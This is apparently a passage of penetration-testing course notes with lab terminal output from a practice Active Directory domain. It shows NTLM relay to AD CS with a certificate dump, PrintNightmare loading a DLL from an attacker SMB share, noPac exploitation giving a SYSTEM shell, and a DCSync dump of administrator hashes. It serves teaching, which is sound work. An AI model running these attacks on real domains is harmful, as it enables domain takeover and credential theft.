+[+] Protocol Attack LDAPS loaded..
+[+] Protocol Attack MSSQL loaded..
+[+] Protocol Attack RPC loaded..
+[+] Protocol Attack SMB loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+[*] Setting up WCF Server
+
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
+[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] GOT CERTIFICATE!
+[*] Base64 certificate of user ACADEMY-EA-DC01$:
+MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQItd0rgWuhmI0CAggAgIIIWAvQEknxhpJWLyXiVGcJcDVCquWE6Ixzn86jywWY4HdhG624zmBgJKXB6OVV9bRODMejBhEoLQQ+jMVNrNoj3wxg6z/QuWp2pWrXS9zwt7bc1SQpMcCjfiFalKIlpPQQiti7xvTMokV+X6YlhUokM9yz3jTAU0ylvw82LoKsKMCKVx0mnhVDUlxR+i1Irn4piInOVfY0c2IAGDdJViVdXgQ7njtkg0R+Ab0CWrqLCtG6nVPIJbxFE5O84s+P3xMBgYoN4cj/06whmVPNyUHfKUbe5ySDnTwREhrFR4DE7kVWwTvkzlS0K8Cqoik7pUlrgIdwRUX438E+bhix+NEa+fW7+rMDrLA4gAvg3C7O8OPYUg2eR0Q+2kN3zsViBQWy8fxOC39lUibxcuow4QflqiKGBC6SRaREyKHqI3UK9sUWufLi7/gAUmPqVeH/JxCi/HQnuyYLjT+TjLr1ATy++GbZgRWT+Wa247voHZUIGGroz8GVimVmI2eZTl1LCxtBSjWUMuP53OMjWzcWIs5AR/4sagsCoEPXFkQodLX+aJ+YoTKkBxgXa8QZIdZn/PEr1qB0FoFdCi6jz3tkuVdEbayK4NqdbtX7WXIVHXVUbkdOXpgThcdxjLyakeiuDAgIehgFrMDhmulHhpcFc8hQDle/W4e6zlkMKXxF4C3tYN3pEKuY02FFq4d6ZwafUbBlXMBEnX7mMxrPyjTsKVPbAH9Kl3TQMsJ1Gg8F2wSB5NgfMQvg229HvdeXmzYeSOwtl3juGMrU/PwJweIAQ6IvCXIoQ4x+kLagMokHBholFDe9erRQapU9f6ycHfxSdpn7WXvxXlZwZVqxTpcRnNhYGr16ZHe3k4gKaHfSLIRst5OHrQxXSjbREzvj+NCHQwNlq2MbSp8DqE1DGhjEuv2TzTbK9Lngq/iqF8KSTLmqd7wo2OC1m8z9nrEP5C+zukMVdN02mObtyBSFt0VMBfb9GY1rUDHi4wPqxU0/DApssFfg06CNuNyxpTOBObvicOKO2IW2FQhiHov5shnc7pteMZ+r3RHRNHTPZs1I5Wyj/KOYdhcCcVtPzzTDzSLkia5ntEo1Y7aprvCNMrj2wqUjrrq+pVdpMeUwia8FM7fUtbp73xRMwWn7Qih0fKzS3nxZ2/yWPyv8GN0l1fOxGR6iEhKqZfBMp6padIHHIRBj9igGlj+D3FPLqCFgkwMmD2eX1qVNDRUVH26zAxGFLUQdkxdhQ6dY2BfoOgn843Mw3EOJVpGSTudLIhh3KzAJdb3w0k1NMSH3ue1aOu6k4JUt7tU+oCVoZoFBCr+QGZWqwGgYuMiq9QNzVHRpasGh4XWaJV8GcDU05/jpAr4zdXSZKove92gRgG2VBd2EVboMaWO3axqzb/JKjCN6blvqQTLBVeNlcW1PuKxGsZm0aigG/Upp8I/uq0dxSEhZy4qvZiAsdlX50HExuDwPelSV4OsIMmB5myXcYohll/ghsucUOPKwTaoqCSN2eEdj3jIuMzQt40A1ye9k4pv6eSwh4jI3EgmEskQjir5THsb53Htf7YcxFAYdyZa9k9IeZR3IE73hqTdwIcXjfXMbQeJ0RoxtywHwhtUCBk+PbNUYvZTD3DfmlbVUNaE8jUH/YNKbW0kKFeSRZcZl5ziwTPPmII4R8amOQ9Qo83bzYv9Vaoo1TYhRGFiQgxsWbyIN/mApIR4VkZRJTophOrbn2zPfK6AQ+BReGn+eyT1N/ZQeML9apmKbGG2N17QsgDy9MSC1NNDE/VKElBJTOk7YuximBx5QgFWJUxxZCBSZpynWALRUHXJdF0wg0xnNLlw4Cdyuuy/Af4eRtG36XYeRoAh0v64BEFJx10QLoobVu4q6/8T6w5Kvcxvy3k4a+2D7lPeXAESMtQSQRdnlXWsUbP5v4bGUtj5k7OPqBhtBE4Iy8U5Qo6KzDUw+e5VymP+3B8c62YYaWkUy19tLRqaCAu3QeLleI6wGpqjqXOlAKv/BO1TFCsOZiC3DE7f+jg1Ldg6xB+IpwQur5tBrFvfzc9EeBqZIDezXlzKgNXU5V+Rxss2AHc+JqHZ6Sp1WMBqHxixFWqE1MYeGaUSrbHz5ulGiuNHlFoNHpapOAehrpEKIo40Bg7USW6Yof2Az0yfEVAxz/EMEEIL6jbSg3XDbXrEAr5966U/1xNidHYSsng9U4V8b30/4fk/MJWFYK6aJYKL1JLrssd7488LhzwhS6yfiR4abcmQokiloUe0+35sJ+l9MN4Vooh+tnrutmhc/ORG1tiCEn0Eoqw5kWJVb7MBwyASuDTcwcWBw5g0wgKYCrAeYBU8CvZHsXU8HZ3Xp7r1otB9JXqKNb3aqmFCJN3tQXf0JhfBbMjLuMDzlxCAAHXxYpeMko1zB2pzaXRcRtxb8P6jARAt7KO8jUtuzXdj+I9g0v7VCm+xQKwcIIhToH/10NgEGQU3RPeuR6HvZKychTDzCyJpskJEG4fzIPdnjsCLWid8MhARkPGciyXYdRFQ0QDJRLk9geQnPOUFFcVIaXuubPHP0UDCssS7rEIVJUzEGexpHSr01W+WwdINgcfHTbgbPyUOH9Ay4gkDFrqckjX3p7HYMNOgDCNS5SY46ZSMgMJDN8G5LIXLOAD0SIXXrVwwmj5EHivdhAhWSV5Cuy8q0Cq9KmRuzzi0Td1GsHGss9rJm2ZGyc7lSyztJJLAH3q0nUc+pu20nqCGPxLKCZL9FemQ4GHVjT4lfPZVlH1ql5Kfjlwk/gdClx80YCma3I1zpLlckKvW8OzUAVlBv5SYCu+mHeVFnMPdt8yIPi3vmF3ZeEJ9JOibE+RbVL8zgtLljUisPPcXRWTCCCcEGCSqGSIb3DQEHAaCCCbIEggmuMIIJqjCCCaYGCyqGSIb3DQEMCgECoIIJbjCCCWowHAYKKoZIhvcNAQwBAzAOBAhCDya+UdNdcQICCAAEgglI4ZUow/ui/l13sAC30Ux5uzcdgaqR7LyD3fswAkTdpmzkmopWsKynCcvDtbHrARBT3owuNOcqhSuvxFfxP306aqqwsEejdjLkXp2VwF04vjdOLYPsgDGTDxggw+eX6w4CHwU6/3ZfzoIfqtQK9Bum5RjByKVehyBoNhGy9CVvPRkzIL9w3EpJCoN5lOjP6Jtyf5bSEMHFy72ViUuKkKTNs1swsQmOxmCa4w1rXcOKYlsM/Tirn/HuuAH7lFsN4uNsnAI/mgKOGOOlPMIbOzQgXhsQu+Icr8LM4atcCmhmeaJ+pjoJhfDiYkJpaZudSZTr5e9rOe18QaKjT3Y8vGcQAi3DatbzxX8BJIWhUX9plnjYU4/1gC20khMM6+amjer4H3rhOYtj9XrBSRkwb4rW72Vg4MPwJaZO4i0snePwEHKgBeCjaC9pSjI0xlUNPh23o8t5XyLZxRr8TyXqypYqyKvLjYQd5U54tJcz3H1S0VoCnMq2PRvtDAukeOIr4z1T8kWcyoE9xu2bvsZgB57Us+NcZnwfUJ8LSH02Nc81qO2S14UV+66PH9Dc+bs3D1Mbk+fMmpXkQcaYlY4jVzx782fN9chF90l2JxVS+u0GONVnReCjcUvVqYoweWdG3SON7YC/c5oe/8DtHvvNh0300fMUqK7TzoUIV24GWVsQrhMdu1QqtDdQ4TFOy1zdpct5L5u1h86bc8yJfvNJnj3lvCm4uXML3fShOhDtPI384eepk6w+Iy/LY01nw/eBm0wnqmHpsho6cniUgPsNAI9OYKXda8FU1rE+wpB5AZ0RGrs2oGOU/IZ+uuhzV+WZMVv6kSz6457mwDnCVbor8S8QP9r7b6gZyGM29I4rOp+5Jyhgxi/68cjbGbbwrVupba/acWVJpYZ0Qj7Zxu6zXENz5YBf6e2hd/GhreYb7pi+7MVmhsE+V5Op7upZ7U2MyurLFRY45tMMkXl8qz7rmYlYiJ0fDPx2OFvBIyi/7nuVaSgkSwozONpgTAZw5IuVp0s8LgBiUNt/MU+TXv2U0uF7ohW85MzHXlJbpB0Ra71py2jkMEGaNRqXZH9iOgdALPY5mksdmtIdxOXXP/2A1+d5oUvBfVKwEDngHsGk1rU+uIwbcnEzlG9Y9UPN7i0oWaWVMk4LgPTAPWYJYEPrS9raV7B90eEsDqmWu0SO/cvZsjB+qYWz1mSgYIh6ipPRLgI0V98a4UbMKFpxVwK0rF0ejjOw/mf1ZtAOMS/0wGUD1oa2sTL59N+vBkKvlhDuCTfy+XCa6fG991CbOpzoMwfCHgXA+ZpgeNAM9IjOy97J+5fXhwx1nz4RpEXi7LmsasLxLE5U2PPAOmR6BdEKG4EXm1W1TJsKSt/2piLQUYoLo0f3r3ELOJTEMTPh33IA5A5V2KUK9iXy/x4bCQy/MvIPh9OuSs4Vjs1S21d8NfalmUiCisPi1qDBVjvl1LnIrtbuMe+1G8LKLAerm57CJldqmmuY29nehxiMhb5EO8D5ldSWcpUdXeuKaFWGOwlfoBdYfkbV92Nrnk6eYOTA3GxVLF8LT86hVTgog1l/cJslb5uuNghhK510IQN9Za2pLsd1roxNTQE3uQATIR3U7O4cT09vBacgiwA+EMCdGdqSUK57d9LBJIZXld6NbNfsUjWt486wWjqVhYHVwSnOmHS7d3t4icnPOD+6xpK3LNLs8ZuWH71y3D9GsIZuzk2WWfVt5R7DqjhIvMnZ+rCWwn/E9VhcL15DeFgVFm72dV54atuv0nLQQQD4pCIzPMEgoUwego6LpIZ8yOIytaNzGgtaGFdc0lrLg9MdDYoIgMEDscs5mmM5JX+D8w41WTBSPlvOf20js/VoOTnLNYo9sXU/aKjlWSSGuueTcLt/ntZmTbe4T3ayFGWC0wxgoQ4g6No/xTOEBkkha1rj9ISA+DijtryRzcLoT7hXl6NFQWuNDzDpXHc5KLNPnG8KN69ld5U+j0xR9D1Pl03lqOfAXO+y1UwgwIIAQVkO4G7ekdfgkjDGkhJZ4AV9emsgGbcGBqhMYMfChMoneIjW9doQO/rDzgbctMwAAVRl4cUdQ+P/s0IYvB3HCzQBWvz40nfSPTABhjAjjmvpGgoS+AYYSeH3iTx+QVD7by0zI25+Tv9Dp8p/G4VH3H9VoU3clE8mOVtPygfS3ObENAR12CwnCgDYp+P1+wOMB/jaItHd5nFzidDGzOXgq8YEHmvhzj8M9TRSFf+aPqowN33V2ey/O418rsYIet8jUH+SZRQv+GbfnLTrxIF5HLYwRaJf8cjkN80+0lpHYbM6gbStRiWEzj9ts1YF4sDxA0vkvVH+QWWJ+fmC1KbxWw9E2oEfZsVcBX9WIDYLQpRF6XZP9B1B5wETbjtoOHzVAE8zd8DoZeZ0YvCJXGPmWGXUYNjx+fELC7pANluqMEhPG3fq3KcwKcMzgt/mvn3kgv34vMzMGeB0uFEv2cnlDOGhWobCt8nJr6b/9MVm8N6q93g4/n2LI6vEoTvSCEBjxI0fs4hiGwLSe+qAtKB7HKc22Z8wWoWiKp7DpMPA/nYMJ5aMr90figYoC6i2jkOISb354fTW5DLP9MfgggD23MDR2hK0DsXFpZeLmTd+M5Tbpj9zYI660KvkZHiD6LbramrlPEqNu8hge9dpftGTvfTK6ZhRkQBIwLQuHel8UHmKmrgV0NGByFexgE+v7Zww4oapf6viZL9g6IA1tWeH0ZwiCimOsQzPsv0RspbN6RvrMBbNsqNUaKrUEqu6FVtytnbnDneA2MihPJ0+7m+R9gac12aWpYsuCnz8nD6b8HPh2NVfFF+a7OEtNITSiN6sXcPb9YyEbzPYw7XjWQtLvYjDzgofP8stRSWz3lVVQOTyrcR7BdFebNWM8+g60AYBVEHT4wMQwYaI4H7I4LQEYfZlD7dU/Ln7qqiPBrohyqHcZcTh8vC5JazCB3CwNNsE4q431lwH1GW9Onqc++/HhF/GVRPfmacl1Bn3nNqYwmMcAhsnfgs8uDR9cItwh41T7STSDTU56rFRc86JYwbzEGCICHwgeh+s5Yb+7z9u+5HSy5QBObJeu5EIjVnu1eVWfEYs/Ks6FI3D/MMJFs+PcAKaVYCKYlA3sx9+83gk0NlAb9b1DrLZnNYd6CLq2N6Pew6hMSUwIwYJKoZIhvcNAQkVMRYEFLqyF797X2SL//FR1NM+UQsli2GgMC0wITAJBgUrDgMCGgUABBQ84uiZwm1Pz70+e0p2GZNVZDXlrwQIyr7YCKBdGmY=
+[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed
+
+<SNIP>
+```
+
+</Accordion>
+
+<Accordion title="Creating a Share with smbserver.py">
+
+### Creating a Share with smbserver.py
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+</Accordion>
+
+<Accordion title="Running NoPac &amp; Getting a Shell">
+
+### Running NoPac & Getting a Shell
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+
+███    ██  ██████  ██████   █████   ██████
+████   ██ ██    ██ ██   ██ ██   ██ ██
+██ ██  ██ ██    ██ ██████  ███████ ██
+██  ██ ██ ██    ██ ██      ██   ██ ██
+██   ████  ██████  ██      ██   ██  ██████
+
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] will try to impersonat administrator
+[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
+[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
+[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
+[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
+[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
+[*] Saving ticket in ACADEMY-EA-DC01.ccache
+[*] Resting the machine account to WIN-LWJFQMAXRVN$
+[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating administrator
+[*]     Requesting S4U2self
+[*] Saving ticket in administrator.ccache
+[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] Rename ccache with target ...
+[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
+[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
+[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
+[*] Exploiting..
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
+```
+
+</Accordion>
+
+<Accordion title="Running the Exploit">
+
+### Running the Exploit
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
+
+[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
+[+] Bind OK
+[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
+[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
+[*] Try 1...
+[*] Stage0: 0
+[*] Try 2...
+[*] Stage0: 0
+[*] Try 3...
+
+<SNIP>
+```
+
+</Accordion>
+
+<Accordion title="Scanning for NoPac">
+
+### Scanning for NoPac
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+
+███    ██  ██████  ██████   █████   ██████
+████   ██ ██    ██ ██   ██ ██   ██ ██
+██ ██  ██ ██    ██ ██████  ███████ ██
+██  ██ ██ ██    ██ ██      ██   ██ ██
+██   ████  ██████  ██      ██   ██  ██████
+
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
+[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
+```
+
+</Accordion>
+
+<Accordion title="Starting ntlmrelayx.py">
+
+### Starting ntlmrelayx.py
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a -
+
+Copyright 2021 SecureAuth Corporation
+
+[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[+] Protocol Attack DCSYNC loaded..
+[+] Protocol Attack HTTP loaded..
+[+] Protocol Attack HTTPS loaded..
+[+] Protocol Attack IMAP loaded..
+[+] Protocol Attack IMAPS loaded..
+[+] Protocol Attack LDAP loaded..
+[+] Protocol Attack LDAPS loaded..
+[+] Protocol Attack MSSQL loaded..
+[+] Protocol Attack RPC loaded..
+[+] Protocol Attack SMB loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+[*] Setting up WCF Server
+
+[*] Servers started, waiting for connections
+```
+
+</Accordion>
+
+<Accordion title="Using noPac to DCSync the Built-in Administrator Account">
+
+### Using noPac to DCSync the Built-in Administrator Account
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+
+███    ██  ██████  ██████   █████   ██████
+████   ██ ██    ██ ██   ██ ██   ██ ██
+██ ██  ██ ██    ██ ██████  ███████ ██
+██  ██ ██ ██    ██ ██      ██   ██ ██
+██   ████  ██████  ██      ██   ██  ██████
+
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] will try to impersonat administrator
+[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
+[*] Exploiting..
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+[*] Kerberos keys grabbed
+inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
+inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
+inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
+[*] Cleaning up...
+```
+
+</Accordion>
+
+<Accordion title="R-Services (Legacy — insecure)">
+
+### R-Services (Legacy — insecure)
+
+**Linux Remote Access: SSH, Rsync, and R-Services · older reference**
+
+```bash
+sudo nmap -sV -p 512,513,514 <IP>
+rlogin <IP> -l <username>      # log in if trusted
+rusers -al <IP>                # detailed logged-in user info
+```
+
+</Accordion>
+
+</AccordionGroup>
